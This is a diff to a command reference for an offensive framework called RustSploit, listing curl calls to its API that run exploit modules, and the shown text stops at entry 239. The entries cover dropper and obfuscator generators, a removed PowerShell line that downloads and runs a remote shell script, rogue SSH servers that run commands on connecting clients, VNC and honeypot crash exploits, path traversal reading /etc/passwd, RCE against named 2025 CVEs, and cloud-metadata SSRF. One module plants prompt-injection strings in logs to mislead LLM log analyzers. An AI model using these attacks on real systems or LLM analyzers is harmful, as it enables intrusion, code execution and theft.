@@ -1,6 +1,8 @@
 # RustSploit API — Template Commands (Complete Reference)
 # ═══════════════════════════════════════════════════════════════
-# Full API command reference for all 194 modules
+# Full API command reference for all 242 modules
+# (legacy entries 1-192 + recently-added entries in the
+# "ADDITIONAL MODULES" section near the end of this file)
 # Default creds: admin/password123, root/toor
 # SNMP community: public
 #
@@ -916,21 +918,9 @@ curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
   }' | python3 -m json.tool
 
 # ─── 43. Banner Grabber ────────────────────────────────────────
-# Grabs banners from multiple ports. Auto-identifies services (SSH, FTP, SMTP, etc.).
-# Prompts: port (single target), ports (multi-port, comma-separated), timeout
-
-curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
-  -H 'Authorization: Bearer testkey123' \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "module": "scanners/banner_grabber",
-    "target": "192.168.1.1",
-    "prompts": {
-      "port": "22",
-      "ports": "21,22,23,25,80,110,143,443,3306,5432,6379,8080",
-      "timeout": "5000"
-    }
-  }' | python3 -m json.tool
+# REMOVED — module deleted. Use `scanners/service_scanner` (entry 44)
+# for service identification or `scanners/port_scanner` (entry 30) for
+# raw banner pulls.
 
 # ─── 44. Service Scanner ───────────────────────────────────────
 # Identifies services and versions on open ports.
@@ -1107,21 +1097,9 @@ curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
   }' | python3 -m json.tool
 
 # ─── 53. Amplification Scanner ─────────────────────────────────
-# Tests for DNS/NTP/SSDP/Memcached amplification vulnerabilities.
-# Prompts: protocols (dns,ntp,ssdp,memcached,all), timeout, verbose
-
-curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
-  -H 'Authorization: Bearer testkey123' \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "module": "scanners/amplification_scanner",
-    "target": "192.168.1.1",
-    "prompts": {
-      "protocols": "all",
-      "timeout": "3000",
-      "verbose": "n"
-    }
-  }' | python3 -m json.tool
+# REMOVED — module deleted. Use `scanners/reflect_scanner` (see
+# ADDITIONAL MODULES section below) for amplification/reflection
+# probing.
 
 # ─── 54. Proxy Scanner ─────────────────────────────────────────
 # Scans for open proxy servers on common ports.
@@ -2662,91 +2640,58 @@ curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
   }' | python3 -m json.tool
 
 # ═══════════════════════════════════════════════════════════════
-# PAYLOAD GENERATOR MODULES (180-184)
+# PAYLOAD GENERATOR MODULES (180-181)
+# Old narutto_dropper / batgen / lnkgen / payload_encoder /
+# polymorph_dropper modules were merged into the unified
+# payloadgen + obfuscator modules below.
 # ═══════════════════════════════════════════════════════════════
 
-# ─── 180. Narutto Dropper ─────────────────────────────────────────
-# Generates staged dropper payload.
-# Prompts: lhost, lport
+# ─── 180. PayloadGen (unified dropper / encoder generator) ────────
+# Replaces narutto_dropper, batgen, lnkgen, payload_encoder,
+# polymorph_dropper. Interactive multi-mode generator — pick which
+# generator via "menu_choice" / "mode_raw" prompts.
+# menu_choice: 1=BatGen, 2=LNK Gen, 3=Polymorph dropper,
+#              4=Payload encoder, 5=Narutto dropper
 curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
   -H 'Authorization: Bearer testkey123' \
   -H 'Content-Type: application/json' \
   -d '{
-    "module": "exploits/payloadgens/narutto_dropper",
-    "target": "10.0.0.5",
-    "prompts": { "lhost": "10.0.0.5", "lport": "4444" }
-  }' | python3 -m json.tool
-
-# ─── 181. BatGen ──────────────────────────────────────────────────
-# Generates BAT dropper that downloads + executes PowerShell payloads.
-# Prompts: output_file (required), payload_url (required), ps1_filename
-curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
-  -H 'Authorization: Bearer testkey123' \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "module": "exploits/payloadgens/batgen",
+    "module": "exploits/payloadgens/payloadgen",
     "target": "10.0.0.5",
     "prompts": {
+      "show_warning": "n",
+      "menu_choice": "1",
       "output_file": "dropper.bat",
-      "payload_url": "https://raw.githubusercontent.com/user/repo/main/payload.ps1",
+      "payload_url": "https://example.com/payload.ps1",
       "ps1_filename": "payload.ps1"
     }
   }' | python3 -m json.tool
 
-# ─── 182. LNK Gen ────────────────────────────────────────────────
-# Generates malicious LNK (shortcut) files for SMB payload delivery.
-# Prompts: output_path (required), smb_ip (required), smb_share (required), smb_file (required)
+# ─── 181. Obfuscator (multi-round payload obfuscation) ────────────
+# Replaces the old payload_encoder. Chains/randomizes multiple
+# obfuscation methods over text / hex / base64 / file input.
+# Prompts: input_kind (text|hex|base64|file), input, mode
+# (chain|random|same), rounds, format, save (y/n), filename.
 curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
   -H 'Authorization: Bearer testkey123' \
   -H 'Content-Type: application/json' \
   -d '{
-    "module": "exploits/payloadgens/lnkgen",
-    "target": "10.0.0.5",
-    "prompts": {
-      "output_path": "/tmp/lnk_output",
-      "smb_ip": "10.0.0.5",
-      "smb_share": "share",
-      "smb_file": "payload.exe"
-    }
-  }' | python3 -m json.tool
-
-# ─── 183. Payload Encoder ────────────────────────────────────────
-# Multi-format encoder: text, hex, base64, file. Output formats: Base64, URL, Hex, etc.
-# Prompts: input_type (1-4), input, encodings, clipboard, save_file, filename
-curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
-  -H 'Authorization: Bearer testkey123' \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "module": "exploits/payloadgens/payload_encoder",
+    "module": "exploits/payloadgens/obfuscator",
     "target": "127.0.0.1",
     "prompts": {
-      "input_type": "1",
+      "input_kind": "text",
       "input": "whoami",
-      "encodings": "4",
-      "save_file": "y",
-      "filename": "encoded_payload.txt"
-    }
-  }' | python3 -m json.tool
-
-# ─── 184. Polymorph Dropper ──────────────────────────────────────
-# Generates polymorphic BAT dropper with staged delays.
-# Prompts: command (required), stage1_delay, stage2_delay, output_file
-curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
-  -H 'Authorization: Bearer testkey123' \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "module": "exploits/payloadgens/polymorph_dropper",
-    "target": "10.0.0.5",
-    "prompts": {
-      "command": "powershell -ep bypass -c IEX(curl http://10.0.0.5/shell.ps1)",
-      "stage1_delay": "1m",
-      "stage2_delay": "5m",
-      "output_file": "dropper.bat"
+      "mode": "random",
+      "rounds": "3",
+      "format": "base64",
+      "save": "y",
+      "filename": "obfuscated.txt"
     }
   }' | python3 -m json.tool
 
 # ═══════════════════════════════════════════════════════════════
 # OTHER EXPLOIT MODULES (185-194)
+# (entry numbers 182-184 were freed by the payload-generator merge above)
 # ═══════════════════════════════════════════════════════════════
 
 # ─── 185. Bluetooth WPair ────────────────────────────────────────
@@ -2884,6 +2829,802 @@ curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
   -d '{
     "module": "exploits/sample_exploit",
     "target": "192.168.1.1"
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# ADDITIONAL MODULES (RECENTLY ADDED — entries 195-247)
+# Modules added after the original 1-194 list. Grouped by category.
+# All entries here are real, registered modules in src/modules/.
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 195. OSINT — Certificate Transparency ────────────────────────
+# Pure OSINT: queries crt.sh for every certificate issued to the
+# target domain and extracts subdomains from CN/SAN. No traffic
+# to the target. Target should be a registrable domain.
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "osint/cert_transparency",
+    "target": "example.com"
+  }' | python3 -m json.tool
+
+# ─── 196. Reflect Scanner (DNS/NTP/SSDP/Memcached amp probe) ──────
+# Replaces the old amplification_scanner. Probes UDP services for
+# amplification potential.
+# Prompts: protos (comma list: dns,ntp,ssdp,memcached or "all"),
+# timeout_ms, verbose
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/reflect_scanner",
+    "target": "192.168.1.1",
+    "prompts": {
+      "protos": "all",
+      "timeout_ms": "3000",
+      "verbose": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 197. SGBox SIEM Recon ────────────────────────────────────────
+# HTTPS reconnaissance for SGBox SIEM consoles: fingerprints version,
+# enumerates installed modules, checks for login-protection bypass.
+# Prompts: https_port, timeout, probe_modules (y/n),
+# check_login_protection (y/n), save (y/n), output_file
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/sgbox_siem_recon",
+    "target": "192.168.1.10",
+    "prompts": {
+      "https_port": "443",
+      "timeout": "10",
+      "probe_modules": "y",
+      "check_login_protection": "y",
+      "save": "y",
+      "output_file": "sgbox_recon.txt"
+    }
+  }' | python3 -m json.tool
+
+# ─── 198. Vuln Checker (run check() across all modules) ───────────
+# Iterates every module exposing pub async fn check() and aggregates
+# vulnerability results for the target. Read-only.
+# Prompts: filter (substring of module path; blank = all),
+# show_all (y/n — include not-vulnerable results)
+curl -s --max-time 600 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/vuln_checker",
+    "target": "192.168.1.1",
+    "prompts": {
+      "filter": "",
+      "show_all": "n"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# ADDITIONAL SSH EXPLOIT MODULES (199-202)
+# Rogue-server / client-poisoning style modules — these *bind* a
+# fake SSH server on the local box and exploit clients that connect
+# (the "target" is the bind address). Use --target 0.0.0.0 to
+# accept any client.
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 199. AsyncSSH BeginAuthPass (client RCE on connect) ──────────
+# Prompts: port, username (impersonated), command (executed on client)
+curl -s --max-time 600 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/asyncssh_beginauthpass",
+    "target": "0.0.0.0",
+    "prompts": {
+      "port": "2222",
+      "username": "root",
+      "command": "id > /tmp/pwned"
+    }
+  }' | python3 -m json.tool
+
+# ─── 200. libssh2 Rogue Server ────────────────────────────────────
+# Prompts: port, log_file
+curl -s --max-time 600 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/libssh2_rogue_server",
+    "target": "0.0.0.0",
+    "prompts": {
+      "port": "2222",
+      "log_file": "libssh2_rogue.log"
+    }
+  }' | python3 -m json.tool
+
+# ─── 201. Paramiko AuthNonePass (client RCE on connect) ───────────
+# Prompts: port, username, command
+curl -s --max-time 600 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/paramiko_authnonepass",
+    "target": "0.0.0.0",
+    "prompts": {
+      "port": "2222",
+      "username": "root",
+      "command": "id > /tmp/pwned"
+    }
+  }' | python3 -m json.tool
+
+# ─── 202. Paramiko Unknown-Method (client RCE on connect) ─────────
+# Prompts: port, username, command
+curl -s --max-time 600 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/paramiko_unknown_method",
+    "target": "0.0.0.0",
+    "prompts": {
+      "port": "2222",
+      "username": "admin",
+      "command": "id > /tmp/pwned"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# VNC EXPLOIT MODULES (203-218)
+# Most are rogue-server style: bind a fake VNC server and crash
+# clients that connect. "target" is the bind address (0.0.0.0).
+# Prompt: bind = "host:port" (e.g. "0.0.0.0:5900").
+# Several are direct-server attacks — see notes per module.
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 203. libvnc CheckRect Overflow ───────────────────────────────
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/libvnc_checkrect_overflow",
+    "target": "0.0.0.0",
+    "prompts": { "bind": "0.0.0.0:5900" }
+  }' | python3 -m json.tool
+
+# ─── 204. libvnc Tight FilterGradient ─────────────────────────────
+# Prompts: bind, num_rows
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/libvnc_tight_filtergradient",
+    "target": "0.0.0.0",
+    "prompts": { "bind": "0.0.0.0:5900", "num_rows": "65535" }
+  }' | python3 -m json.tool
+
+# ─── 205. libvnc UltraZip ─────────────────────────────────────────
+# Prompts: bind, num_rects
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/libvnc_ultrazip",
+    "target": "0.0.0.0",
+    "prompts": { "bind": "0.0.0.0:5900", "num_rects": "1024" }
+  }' | python3 -m json.tool
+
+# ─── 206. libvnc WebSocket Overflow ───────────────────────────────
+# Prompts: bind, payload_len
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/libvnc_websocket_overflow",
+    "target": "0.0.0.0",
+    "prompts": { "bind": "0.0.0.0:5900", "payload_len": "131072" }
+  }' | python3 -m json.tool
+
+# ─── 207. libvnc ZRLE Tile ────────────────────────────────────────
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/libvnc_zrle_tile",
+    "target": "0.0.0.0",
+    "prompts": { "bind": "0.0.0.0:5900" }
+  }' | python3 -m json.tool
+
+# ─── 208. TigerVNC RRE Overflow ───────────────────────────────────
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/tigervnc_rre_overflow",
+    "target": "0.0.0.0",
+    "prompts": { "bind": "0.0.0.0:5900" }
+  }' | python3 -m json.tool
+
+# ─── 209. TigerVNC Timing Oracle (password recovery) ──────────────
+# Direct-server attack against a real VNC server.
+# Prompts: samples (number of timing samples per byte)
+curl -s --max-time 600 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/tigervnc_timing_oracle",
+    "target": "192.168.1.50",
+    "prompts": { "samples": "100" }
+  }' | python3 -m json.tool
+
+# ─── 210. TightVNC Decompression Bomb (server attack) ─────────────
+# Sends compressed payload that explodes during decompression.
+# Prompts: password, bomb_size
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/tightvnc_decompression_bomb",
+    "target": "192.168.1.50",
+    "prompts": { "password": "", "bomb_size": "104857600" }
+  }' | python3 -m json.tool
+
+# ─── 211. TightVNC DES Hard-Coded Key ─────────────────────────────
+# Decrypts vncpasswd files using TightVNC's hard-coded DES key.
+# Prompt: encrypted hex string from .vnc/passwd
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/tightvnc_des_hardcoded_key",
+    "target": "127.0.0.1",
+    "prompts": { "encrypted": "1c3a9bdf2e..." }
+  }' | python3 -m json.tool
+
+# ─── 212. TightVNC FT Path Traversal ──────────────────────────────
+# Prompts: password, mode (list|read|write), remote_path,
+# local_file (only for write mode)
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/tightvnc_ft_path_traversal",
+    "target": "192.168.1.50",
+    "prompts": {
+      "password": "",
+      "mode": "read",
+      "remote_path": "../../../etc/passwd"
+    }
+  }' | python3 -m json.tool
+
+# ─── 213. TightVNC Predictable Challenge ──────────────────────────
+# Direct-server attack — exploits weak RNG in challenge generation.
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/tightvnc_predictable_challenge",
+    "target": "192.168.1.50"
+  }' | python3 -m json.tool
+
+# ─── 214. TightVNC Rect Overflow ──────────────────────────────────
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/tightvnc_rect_overflow",
+    "target": "0.0.0.0",
+    "prompts": { "bind": "0.0.0.0:5900" }
+  }' | python3 -m json.tool
+
+# ─── 215. x11vnc DNS Injection ────────────────────────────────────
+# Prompts: attacker_ip, inject_cmd, dns_port
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/x11vnc_dns_injection",
+    "target": "192.168.1.50",
+    "prompts": {
+      "attacker_ip": "10.0.0.5",
+      "inject_cmd": "id",
+      "dns_port": "5353"
+    }
+  }' | python3 -m json.tool
+
+# ─── 216. x11vnc Env Injection ────────────────────────────────────
+# Prompts: hook_script, inject_ip
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/x11vnc_env_injection",
+    "target": "192.168.1.50",
+    "prompts": {
+      "hook_script": "/tmp/hook.sh",
+      "inject_ip": "10.0.0.5"
+    }
+  }' | python3 -m json.tool
+
+# ─── 217. x11vnc UnixPW Inject ────────────────────────────────────
+# Prompts: inject_user, password
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/vnc/x11vnc_unixpw_inject",
+    "target": "192.168.1.50",
+    "prompts": {
+      "inject_user": "root",
+      "password": "password123"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# COWRIE HONEYPOT EXPLOITS (218-220)
+# Findings against the cowrie SSH honeypot. Default target:
+# loopback on port 2222 with creds root:root or root:1234.
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 218. Cowrie ANSI Log Injection ───────────────────────────────
+# Embeds ANSI/OSC escapes in cowrie's command log. When an operator
+# views the log via cat/tail on a real tty, the escapes execute
+# (terminal title hijack, bell spam, cursor reposition).
+# Prompts: port, username, password, payload (0=title, 1=bell, 2=cr)
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cowrie/ansi_log_injection",
+    "target": "127.0.0.1",
+    "prompts": {
+      "port": "2222",
+      "username": "root",
+      "password": "root",
+      "payload": "0"
+    }
+  }' | python3 -m json.tool
+
+# ─── 219. Cowrie LLM Prompt Injection ─────────────────────────────
+# Injects prompt-injection strings into cowrie's session log so
+# downstream LLM-based log analyzers misclassify the session.
+# Prompts: mode (dry/live), port, username, password, injection (idx)
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cowrie/llm_prompt_injection",
+    "target": "127.0.0.1",
+    "prompts": {
+      "mode": "live",
+      "port": "2222",
+      "username": "root",
+      "password": "root",
+      "injection": "0"
+    }
+  }' | python3 -m json.tool
+
+# ─── 220. Cowrie SSRF IPv6 ────────────────────────────────────────
+# Abuses cowrie's wget/curl emulation to issue outbound IPv6 SSRF.
+# Prompts: mode (static/live), ssh_port, username, password
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cowrie/ssrf_ipv6",
+    "target": "127.0.0.1",
+    "prompts": {
+      "mode": "live",
+      "ssh_port": "2222",
+      "username": "root",
+      "password": "1234"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# DIONAEA HONEYPOT EXPLOITS (221-224)
+# Crash / SQLi vectors against the dionaea honeypot's emulated
+# protocols.
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 221. Dionaea MQTT Underflow ──────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/dionaea/mqtt_underflow",
+    "target": "127.0.0.1",
+    "prompts": { "port": "1883" }
+  }' | python3 -m json.tool
+
+# ─── 222. Dionaea MSSQL DoS ───────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/dionaea/mssql_dos",
+    "target": "127.0.0.1",
+    "prompts": { "port": "1433" }
+  }' | python3 -m json.tool
+
+# ─── 223. Dionaea MySQL SQLi ──────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/dionaea/mysql_sqli",
+    "target": "127.0.0.1",
+    "prompts": { "port": "3306" }
+  }' | python3 -m json.tool
+
+# ─── 224. Dionaea TFTP Crash ──────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/dionaea/tftp_crash",
+    "target": "127.0.0.1",
+    "prompts": { "port": "69" }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# HONEYTRAP / SNARE / TANNER EXPLOITS (225-228)
+# Crash and MITM vectors against the honeytrap and snare/tanner
+# honeypot stack.
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 225. honeytrap Docker Panic ──────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/honeytrap/docker_panic",
+    "target": "127.0.0.1",
+    "prompts": { "port": "2375" }
+  }' | python3 -m json.tool
+
+# ─── 226. honeytrap FTP Panic ─────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/honeytrap/ftp_panic",
+    "target": "127.0.0.1",
+    "prompts": { "port": "21" }
+  }' | python3 -m json.tool
+
+# ─── 227. snare Cookie DoS ────────────────────────────────────────
+# Prompts: port, path
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/snare/cookie_dos",
+    "target": "127.0.0.1",
+    "prompts": { "port": "8080", "path": "/" }
+  }' | python3 -m json.tool
+
+# ─── 228. snare/tanner Version MITM ───────────────────────────────
+# Bind an HTTP listener that serves a forged tanner version string.
+# Prompts: port (default 8090), version, one_shot (yes/no)
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/snare/tanner_version_mitm",
+    "target": "0.0.0.0",
+    "prompts": {
+      "port": "8090",
+      "version": "0.6.0",
+      "one_shot": "no"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# SAFELINE WAF EXPLOITS (229-234)
+# Probes / exploits against the SafeLine WAF management interface.
+# Default management port is 9443.
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 229. SafeLine Cookie Attributes ──────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/safeline/cookie_attributes",
+    "target": "192.168.1.10",
+    "prompts": { "port": "9443" }
+  }' | python3 -m json.tool
+
+# ─── 230. SafeLine Nginx Injection ────────────────────────────────
+# Prompts: port, cookie, mode (plain/lua), dry_run (yes/no)
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/safeline/nginx_injection",
+    "target": "192.168.1.10",
+    "prompts": {
+      "port": "9443",
+      "cookie": "session=...",
+      "mode": "plain",
+      "dry_run": "yes"
+    }
+  }' | python3 -m json.tool
+
+# ─── 231. SafeLine No-Auth Probe ──────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/safeline/no_auth_probe",
+    "target": "192.168.1.10",
+    "prompts": { "port": "9443" }
+  }' | python3 -m json.tool
+
+# ─── 232. SafeLine Pre-Auth TFA ───────────────────────────────────
+# Prompts: port, dry_run (yes/no)
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/safeline/pre_auth_tfa",
+    "target": "192.168.1.10",
+    "prompts": { "port": "9443", "dry_run": "yes" }
+  }' | python3 -m json.tool
+
+# ─── 233. SafeLine Session Secret Entropy ─────────────────────────
+# Prompts: port, no_probe (yes/no)
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/safeline/session_secret_entropy",
+    "target": "192.168.1.10",
+    "prompts": { "port": "9443", "no_probe": "no" }
+  }' | python3 -m json.tool
+
+# ─── 234. SafeLine Unauth Writes ──────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/safeline/unauth_writes",
+    "target": "192.168.1.10",
+    "prompts": { "port": "9443" }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# ADDITIONAL FRAMEWORK EXPLOITS (235-236)
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 235. Apache Camel Header Injection CVE-2025-27636 ────────────
+# Prompts: port, scheme (http/https), path, command, inject_header
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/apache_camel/cve_2025_27636_camel_header_injection",
+    "target": "192.168.1.20",
+    "prompts": {
+      "port": "8080",
+      "scheme": "http",
+      "path": "/",
+      "command": "id",
+      "inject_header": "CamelExec"
+    }
+  }' | python3 -m json.tool
+
+# ─── 236. PHP RCE CVE-2025-51373 ──────────────────────────────────
+# Prompts: port, scheme, cgi_path, command (PHP code)
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/php/cve_2025_51373_php_rce",
+    "target": "192.168.1.20",
+    "prompts": {
+      "port": "80",
+      "scheme": "http",
+      "cgi_path": "/cgi-bin/php-cgi",
+      "command": "echo shell_exec(\"id\");"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# ADDITIONAL NETWORK INFRA EXPLOITS (237-238)
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 237. Commvault RCE CVE-2025-34028 ────────────────────────────
+# Prompts: port, scheme, shell_name, command
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/commvault/cve_2025_34028_commvault_rce",
+    "target": "192.168.1.30",
+    "prompts": {
+      "port": "443",
+      "scheme": "https",
+      "shell_name": "cv_shell",
+      "command": "id"
+    }
+  }' | python3 -m json.tool
+
+# ─── 238. Kubernetes Ingress-Nginx RCE CVE-2025-1974 ──────────────
+# Prompts: port (admission webhook, default 8443), mode, ssrf_url
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/kubernetes/cve_2025_1974_ingress_nginx_rce",
+    "target": "192.168.1.40",
+    "prompts": {
+      "port": "8443",
+      "mode": "rce",
+      "ssrf_url": "http://169.254.169.254/latest/meta-data/"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# ADDITIONAL WEB APPLICATION EXPLOITS (239-246)
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 239. API Attack Suite ────────────────────────────────────────
